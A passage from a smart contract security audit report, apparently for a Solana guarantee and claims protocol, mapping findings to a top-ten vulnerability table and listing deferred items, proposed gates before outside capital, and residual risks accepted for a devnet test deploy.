| SC01 Access Control | New gaps around the protocol admin: no on-chain delay or veto; `propose_admin` accepts any key; members read proposals through one origin; Squads config changes approved blind; a single admin signer can veto everything. The payments-account separation is checked only at install. The test deploy's multisig keys share one machine. | NEW-R1-3, NEW-R3-1, NEW-R3-2, Info-R1-9, AV-R1-4, NEW-R1-5, S10 |
| SC02 Business Logic | The operator's registry actions are not reversible in the deployed binary, and their impact is larger than documented. The period-cap raise widens unapproved headroom. No clean return path for a claim payment; settlement records cannot be corrected; dust filings. | NEW-R1-1, F-R1-2, F-R1-6, E-R1-7, Info-R1-8 |
| SC03 Price Oracle Manipulation | Still no oracle read. NAV can be moved by privileged filings that cannot be undone in the binary; the fill `nav_bounds` then refuse. | NEW-R1-1 |
| SC04 Flash Loan Attacks | No change. Not applicable. | Section 6 |
| SC05 Lack of Input Validation | No minimum filing amount; no check that an upgrade buffer declares the target program ID. | Info-R1-8, S14 |
| SC06 Unchecked External Calls | No change. `vault_transfer` and `emit_event!` are proven equivalent to the CPIs they replaced. | Section 6 (R2) |
| SC07 Arithmetic Errors | No change. Rounding and the window arithmetic are confirmed sound. | Section 6 |
| SC08 Reentrancy | No change. Not applicable to the pilot. | |
| SC09 Integer Overflow and Underflow | No change. #60 keeps overflow checks on in release builds. | Section 6 (R2) |
| SC10 Proxy and Upgradeability | Main area of new findings: no signer-side upgrade check, an unpinned release ref, overwritable release assets and baseline, non-reproducible deployed bytes, unpinned toolchains, the payer key exposed to `node_modules`. | S9, S11, S12, S13, S14, S15, S16, S17 |

---

## 8. Deferred items and residual risks

### 8.1 Already deferred and documented

These are accepted deferrals in [known limitations](../security/known-limitations.md). They are not findings of this audit, except where NEW-R1-1 corrects their stated impact.

- `amend_claim`, `refile_claim` and `reinstate_guarantee` (first upgrade). NEW-R1-1 asks that they ship before outside capital and that the reinstate age check covers closes made before the upgrade.
- The exit fallback and the claim-notice gate (before outside capital).
- Partial fills at the queue head, the cumulative NAV-guard baseline (first upgrade).
- Unsolicited-money handling, adapters, the phase-2 instant exit, the fiança lifecycle states (later).
- Transfer-restricted shares (before mainnet).

### 8.2 Tracked elsewhere, not re-reported

- #91: the real deploy under the declared ID with a verified build (see S10, S13).
- #99: devnet Squads time locks (60 s and 120 s on the test deploy, against 300 s and 3,600 s in ADR 0028).
- #55: `verify.ts` skips guardians when the field is absent.
- #56: amend and refile must bump the revision and reset approval.
- #21, #30.

### 8.3 Gates proposed before outside capital

- Invariant 21 holds in the binary: `amend_claim` and `reinstate_guarantee` shipped, or an interim `max_open_provisions` in place (NEW-R1-1).
- An unapproved-payment cap separate from the raised period cap (F-R1-2).
- An on-chain delay and veto for risk-increasing admin actions, and a Squads-vault check on `propose_admin` (NEW-R1-3).
- Out-of-browser proposal verification and an out-of-band proposal watcher (NEW-R3-1, NEW-R3-2); signer-side upgrade checks against a reproduced build (S9).
- An enforced CSP (A-R3-1).
- 2-of-3 admin and upgrade multisigs with an independent key, no two member keys on one machine, and no blind signing (Info-R1-9, S10).
- An independent audit.

### 8.4 Residual risks accepted for the devnet test deploy

- **The test deploy's multisig members are harness keys on one machine** (S10). Its upgrade authority gives no real separation. No real money is held.
- **Test time locks of 60 s and 120 s** (#99).
- **The deployed bytes are not reproducible by a third party** (S13).
- **The NAV guard is effectively off on devnet** (`maxNavMoveBps = 10_000`); it is proven in tests only.
- **Claim payments after an operator compromise are lost**, bounded by one window's headroom of the claim caps (R$15k per call, R$20k per 31 days), except as noted in section 6.
- **A fake filing cannot be undone** until Wave 2, and enough of them freeze exits and new guarantees (NEW-R1-1).
- **The issuer can freeze BRS.** A frozen reserve blocks claim payments and new guarantees. This is disclosed issuer trust.
